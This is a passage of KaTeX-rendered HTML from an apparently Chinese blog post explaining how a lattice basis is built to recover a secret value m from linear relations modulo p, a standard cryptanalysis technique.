mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord mathnormal">b</span></span></span></span></span></p><p>于是我们可以得到一个跟上图差不多的格，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">secret</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">secre</span><span class="mord mathnormal">t</span></span></span></span>就是我们所求的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是我们的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">r_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是我们的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<br>右边的向量即为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>K</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}b &amp; b &amp; b &amp; \dots &amp; K/p &amp; -K\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><br>格构造如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mstyle mathsize="0.9em"><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>l</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>l</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>l</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>K</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>K</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mstyle></mrow><annotation encoding="application/x-tex">\small \begin{pmatrix}l_1 &amp; l_2 &amp; \dots &amp; l_n &amp; m &amp; -1\end{pmatrix}\begin{pmatrix}p &amp; 0 &amp; \dots &amp; 0 &amp; 0 &amp; 0 \\0 &amp; p &amp; \dots &amp; 0 &amp; 0 &amp; 0 \\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \vdots \\0 &amp; 0 &amp; \dots &amp; p &amp; 0 &amp; 0 \\a_1 &amp; a_2 &amp; \dots &amp; a_n &amp; K/p &amp; 0 \\c_1 &amp; c_2 &amp; \dots &amp; c_n &amp; 0 &amp; K\end{pmatrix}=\begin{pmatrix}b &amp; b &amp; b &amp; \dots &amp; K/p &amp; -K\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.224em;vertical-align:-3.387em;"></span><span class="minner sizing reset-size6 size5"><span class="mopen sizing reset-size5 size6 delimcenter" style="top:0.025em;">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:-0.0197em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:-0.0197em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.137em;"><span style="top:-2.45em;margin-left:-0.0197em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose sizing reset-size5 size6 delimcenter" style="top:0.025em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner sizing reset-size6 size5"><span class="mopen sizing reset-size5 size6"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.825em;"><span style="top:-5.8249em;"><span class="pstrut" style="height:9.2em;"></span><span style="width:0.875em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="7.200em" viewBox="0 0 875 7200"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,3684c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-3692c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.375em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.09em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-5.89em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-3.8633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-2.6633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-1.4633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-0.2633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.137em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.137em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 